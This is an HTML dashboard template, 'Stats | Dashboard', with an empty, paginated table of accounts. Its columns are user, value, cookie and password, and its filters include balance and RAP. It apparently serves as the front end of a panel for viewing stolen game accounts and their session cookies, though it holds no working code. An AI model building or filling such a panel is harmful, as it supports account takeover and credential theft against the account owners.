<!doctype html>
<html lang="en" class="dark bg-[#070707]">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Stats | Dashboard</title>
    <meta name="description" content="Accounts and stats" />
    <link rel="icon" href="/public/icon.svg" type="image/svg+xml" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600;700&family=Geist+Mono:wght@400;500&display=swap"
      rel="stylesheet"
    />
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
      tailwind.config = {
        darkMode: "class",
        theme: {
          extend: {
            fontFamily: {
              sans: ['Geist', 'ui-sans-serif', 'system-ui', 'sans-serif'],
              mono: ['Geist Mono', 'ui-monospace', 'monospace'],
            },
          },
        },
      }
    </script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script defer src="assets/main.js"></script>
  </head>
  <body class="bg-[#070707] font-sans antialiased text-neutral-200">
    <div id="page" data-breadcrumb="Stats">
      <!-- Header row -->
      <div class="flex flex-col gap-4 lg:flex-row lg:items-center lg:justify-between">
        <p class="text-sm text-neutral-400">
          Loaded <span class="font-semibold text-neutral-100">0</span> of 0 account(s)
        </p>
        <div class="-mx-1 flex items-center gap-1 overflow-x-auto px-1 pb-1">
          <button type="button" data-filter class="flex shrink-0 items-center gap-1.5 rounded-full px-3 py-1.5 text-sm transition-colors bg-white/[0.1] text-neutral-100">
            <i data-lucide="filter" class="size-3.5"></i>All
          </button>
          <button type="button" data-filter class="flex shrink-0 items-center gap-1.5 rounded-full px-3 py-1.5 text-sm transition-colors text-neutral-500 hover:text-neutral-200">
            <i data-lucide="id-card" class="size-3.5"></i>Username
          </button>
          <button type="button" data-filter class="flex shrink-0 items-center gap-1.5 rounded-full px-3 py-1.5 text-sm transition-colors text-neutral-500 hover:text-neutral-200">
            <i data-lucide="clock" class="size-3.5"></i>Recent
          </button>
          <button type="button" data-filter class="flex shrink-0 items-center gap-1.5 rounded-full px-3 py-1.5 text-sm transition-colors text-neutral-500 hover:text-neutral-200">
            <i data-lucide="circle-dollar-sign" class="size-3.5"></i>Balance
          </button>
          <button type="button" data-filter class="flex shrink-0 items-center gap-1.5 rounded-full px-3 py-1.5 text-sm transition-colors text-neutral-500 hover:text-neutral-200">
            <i data-lucide="trending-up" class="size-3.5"></i>RAP
          </button>
          <button type="button" data-filter class="flex shrink-0 items-center gap-1.5 rounded-full px-3 py-1.5 text-sm transition-colors text-neutral-500 hover:text-neutral-200">
            <i data-lucide="trending-up" class="size-3.5"></i>Summary
          </button>
        </div>
      </div>

      <!-- Table -->
      <div class="mt-4 overflow-hidden rounded-2xl border border-white/[0.07] bg-white/[0.02]">
        <div class="overflow-x-auto">
          <table class="w-full min-w-[640px] border-collapse">
            <thead>
              <tr class="border-b border-white/[0.06]">
                <th class="px-5 py-3 text-left text-xs font-medium tracking-wide text-neutral-500">
                  <span class="flex items-center gap-1.5">USER <i data-lucide="user" class="size-3 text-neutral-600"></i></span>
                </th>
                <th class="px-5 py-3 text-left text-xs font-medium tracking-wide text-neutral-500">
                  <span class="flex items-center gap-1.5">VALUE <i data-lucide="activity" class="size-3 text-neutral-600"></i></span>
                </th>
                <th class="px-5 py-3 text-left text-xs font-medium tracking-wide text-neutral-500">
                  <span class="flex items-center gap-1.5">COOKIE <i data-lucide="shield-check" class="size-3 text-neutral-600"></i></span>
                </th>
                <th class="px-5 py-3 text-left text-xs font-medium tracking-wide text-neutral-500">
                  <span class="flex items-center gap-1.5">PASSWORD</span>
                </th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td colspan="4" class="h-72 text-center">
                  <span class="text-sm text-neutral-500">No results.</span>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>

      <!-- Footer / pagination -->
      <div class="mt-4 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
        <p class="text-sm text-neutral-500">No accounts to display.</p>
        <div class="flex items-center gap-3">
          <span class="text-sm text-neutral-400">Page <span class="font-semibold text-neutral-100">1</span> of 1</span>
          <button type="button" disabled class="rounded-lg border border-white/[0.07] px-3 py-1.5 text-sm text-neutral-500 transition-colors hover:text-neutral-200 disabled:cursor-not-allowed disabled:opacity-50">Previous</button>
          <button type="button" disabled class="rounded-lg border border-white/[0.07] px-3 py-1.5 text-sm text-neutral-500 transition-colors hover:text-neutral-200 disabled:cursor-not-allowed disabled:opacity-50">Next</button>
        </div>
      </div>
    </div>
  </body>
</html>
